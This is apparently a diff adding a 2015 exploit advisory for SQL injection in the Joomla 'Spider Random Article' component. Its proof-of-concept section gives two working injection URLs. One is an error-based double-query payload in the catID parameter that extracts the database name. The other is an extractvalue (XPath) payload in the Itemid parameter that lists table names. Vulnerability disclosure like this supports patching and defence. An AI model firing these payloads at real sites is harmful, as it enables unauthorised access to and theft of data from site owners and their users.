@@ -1,0 +1,54 @@
+##################################################################################################
+#Exploit Title : Joomla Spider Random Article Component SQL Injection vulnerability
+#Author        : Jagriti Sahu AKA Incredible
+#Vendor Link   : http://demo.web-dorado.com/spider-random-article.html
+#Date          : 22/03/2015
+#Discovered at : IndiShell Lab
+#Love to       : error1046 ^_^ ,Team IndiShell,Codebreaker ICA ,Subhi,Mrudu,Hary,Kavi ^_^
+##################################################################################################
+
+////////////////////////
+/// Overview:
+////////////////////////
+
+
+joomla component "Spider Random Article" is not filtering data in catID and Itemid parameters
+and hence affected by SQL injection vulnerability 
+
+///////////////////////////////
+// Vulnerability Description:
+///////////////////////////////
+vulnerability is due to catID and Itemid parameter 
+
+
+////////////////
+///  POC   ////
+///////////////
+
+
+SQL Injection in catID parameter
+=================================
+
+Use error based double query injection with catID parameter
+
+Injected Link--->
+
+Like error based double query injection for exploiting username --->
+http://server/index.php?option=com_rand&catID=1' and(select 1 FROM(select count(*),concat((select (select concat(database(),0x27,0x7e)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -&limit=1&style=1&view=articles&format=raw&Itemid=13 
+
+
+SQL Injection in Itemid parameter
+=================================
+
+Itemid Parameter is exploitable using xpath injection
+ 
+http://server/index.php?option=com_rand&catID=1&limit=1&style=1&view=articles&format=raw&Itemid=13'and extractvalue(6678,concat(0x7e,(select  table_name from information_schema.tables where table_schema=database() LIMIT 0,1),0x7e ))-- -
+
+###################################################################################################
+
+
+				   --==[[Special Thanks to]]==--
+
+			          #  Manish Kishan Tanwar  ^_^ #
+
+
